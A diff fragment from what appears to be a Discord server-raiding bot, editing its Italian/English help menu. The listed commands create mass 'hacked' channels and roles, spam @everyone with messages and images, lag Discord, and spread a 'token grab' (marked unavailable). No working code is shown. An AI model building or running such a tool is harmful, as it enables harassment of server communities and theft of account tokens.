@@ -29,7 +29,7 @@ shit.on("message", tadishit => {
  :loud_sound: !voice - Create 30 voice name hacked (Disponibile)
  :ferris_wheel: !role - Create 30 role name hacked (Disponibile)
  :warning: !spam - Spam In Channels: [@everyone] (Disponibile)
- :frame_photo: !imagespam - Spam In Channels Images With: [@everyone] (Disponibile)
+ :frame_photo: !imagespam - Spam In Channels Images With: [@everyone] (Non disponibile)
  :radioactive: !lag - lag discord: [@everyone] (Disponibile)
  :santa: !christams - Spam In Channels Christmas gif: [@everyone] (Disponibile)
  :key: !free - Spam In Channels Token Grab: [@everyone] (Non disponibile)
